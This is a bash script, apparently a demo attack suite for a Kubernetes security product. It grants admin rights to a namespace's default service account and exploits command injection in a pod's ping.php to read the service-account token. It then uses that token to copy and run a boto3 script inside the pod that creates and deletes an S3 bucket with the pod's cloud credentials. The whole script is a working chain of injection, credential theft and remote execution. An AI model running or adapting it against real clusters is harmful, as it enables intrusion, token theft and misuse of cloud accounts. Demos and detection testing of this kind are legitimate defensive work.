#!/usr/bin/env bash

NAMESPACE="attack-suite"  # Define the namespace variable

function setup_port_forwarding() {
    echo "[+] Starting port forwarding to ping-app on port 8080..."
    kubectl port-forward -n $NAMESPACE ping-app 8080:80 &
    PORT_FORWARD_PID=$!
    sleep 3
    # Check if the rolebinding already exists
    if ! kubectl get rolebinding attack-suite-admin -n $NAMESPACE &>/dev/null; then
        echo "[+] Creating attack-suite-admin rolebinding..."
        kubectl create rolebinding attack-suite-admin \
          --clusterrole=admin \
          --serviceaccount=$NAMESPACE:default \
          --namespace=$NAMESPACE
    else
        echo "[+] attack-suite-admin rolebinding already exists"
    fi
}

function check_port_forwarding() {
    echo "[+] Checking if port forwarding is successful..."
    if nc -z localhost 8080 >/dev/null 2>&1; then
        echo "[+] Port forwarding established successfully"
    else
        echo "[-] Failed to establish port forwarding"
        kill $PORT_FORWARD_PID 2>/dev/null
        exit 1
    fi
}

function retrieve_token() {
    echo "[+] Retrieving service account token..."
    wget -O token.txt "http://localhost:8080/ping.php?ip=1.1.1.1;/bin/cat /var/run/secrets/kubernetes.io/serviceaccount/token"
    grep -o "eyJ.*" token.txt | sed 's/<br.*$//' > final_token.txt
    TOKEN=$(cat final_token.txt)
}

function find_pod_name() {
    echo "[+] Finding ping-app pod in $NAMESPACE namespace..."
    POD_NAME=$(kubectl --token $TOKEN --insecure-skip-tls-verify get pods -n $NAMESPACE -l app=ping-app -o name | head -1)
    if [ -n "$POD_NAME" ]; then
        echo "[+] Found pod: $POD_NAME"
    else
        echo "[-] Failed to find ping-app pod in $NAMESPACE namespace"
        exit 1
    fi
}

function create_s3_script() {
    if [ ! -f "s3_buckets.py" ]; then
        echo "[+] Creating s3_buckets.py file..."
        cat > s3_buckets.py << 'EOF'
#!/usr/bin/env python3
import boto3
import json
import time

def create_bucket(bucket_name):
    try:
        s3 = boto3.client('s3')
        print(f"Creating bucket: {bucket_name}")
        
        # Create the bucket (default region is us-east-1)
        # For other regions, you need to specify LocationConstraint in CreateBucketConfiguration
        s3.create_bucket(Bucket=bucket_name)
        print(f"Successfully created bucket: {bucket_name}")
        return True
    except Exception as e:
        print(f"Error creating bucket: {str(e)}")
        return False

def delete_bucket(bucket_name):
    try:
        s3 = boto3.client('s3')
        print(f"Deleting bucket: {bucket_name}")
        
        # Check if bucket has objects and delete them first
        try:
            objects = s3.list_objects_v2(Bucket=bucket_name)
            if 'Contents' in objects:
                print(f"  Deleting objects from bucket first...")
                for obj in objects['Contents']:
                    s3.delete_object(Bucket=bucket_name, Key=obj['Key'])
                    print(f"    Deleted object: {obj['Key']}")
        except Exception as e:
            print(f"  Error listing/deleting objects: {str(e)}")
        
        # Delete the bucket
        s3.delete_bucket(Bucket=bucket_name)
        print(f"Successfully deleted bucket: {bucket_name}")
        return True
    except Exception as e:
        print(f"Error deleting bucket: {str(e)}")
        return False

if __name__ == "__main__":
    bucket_name = "armo-demo"
    
    # Create the demo bucket
    print("\n=== Creating Demo Bucket ===")
    bucket_created = create_bucket(bucket_name)
    
    # Give AWS some time to propagate the bucket creation
    if bucket_created:
        print("Waiting for bucket to be available...")
        time.sleep(5)
    
    # Delete the demo bucket we created
    if bucket_created:
        print("\n=== Deleting Demo Bucket ===")
        delete_bucket(bucket_name)
EOF
        chmod +x s3_buckets.py
    fi
}

function copy_script_to_pod() {
    POD_NAME_ONLY=$(echo $POD_NAME | cut -d'/' -f2)
    echo "[+] Copying s3_buckets.py to the pod using kubectl cp..."
    kubectl --token $TOKEN --insecure-skip-tls-verify cp ./s3_buckets.py $NAMESPACE/$POD_NAME_ONLY:/tmp/s3_buckets.py
    if [ $? -eq 0 ]; then
        echo "[+] Successfully copied s3_buckets.py to the pod"
    else
        echo "[-] Failed to copy s3_buckets.py to the pod"
        exit 1
    fi
}

function verify_script_in_pod() {
    echo "[+] Verifying s3_buckets.py exists in the pod..."
    FILE_CHECK=$(kubectl --token $TOKEN --insecure-skip-tls-verify exec -n $NAMESPACE $POD_NAME_ONLY -- ls -la /tmp/s3_buckets.py 2>/dev/null)
    if [ $? -eq 0 ]; then
        echo "[+] Verified s3_buckets.py exists in the pod at /tmp/s3_buckets.py"
    else
        echo "[-] Could not verify if s3_buckets.py exists in the pod"
        exit 1
    fi
}

function execute_script_in_pod() {
    echo "[+] Executing s3_buckets.py in the pod..."
    kubectl --token $TOKEN --insecure-skip-tls-verify exec -n $NAMESPACE $POD_NAME_ONLY -- python3 /tmp/s3_buckets.py
    if [ $? -eq 0 ]; then
        echo "[+] Successfully executed s3_buckets.py in the pod"
    else
        echo "[-] Failed to execute s3_buckets.py in the pod"
    fi
}

function cleanup() {
    echo "[+] Cleaning up temporary files..."
    rm -f token.txt final_token.txt s3_buckets.py
}

function stop_port_forwarding() {
    echo "[+] Checking for port forwarding processes..."
    PF_PIDS=$(ps aux | grep "kubectl port-forward" | grep -v grep | awk '{print $2}')
    if [ -n "$PF_PIDS" ]; then
        echo "[+] Killing port-forwarding processes..."
        echo $PF_PIDS | xargs kill
        echo "[+] Port forwarding stopped."
    else
        echo "[+] No port forwarding processes found."
    fi
}

# Main script execution
setup_port_forwarding
check_port_forwarding
retrieve_token
find_pod_name
create_s3_script
copy_script_to_pod
verify_script_in_pod
execute_script_in_pod
cleanup
stop_port_forwarding
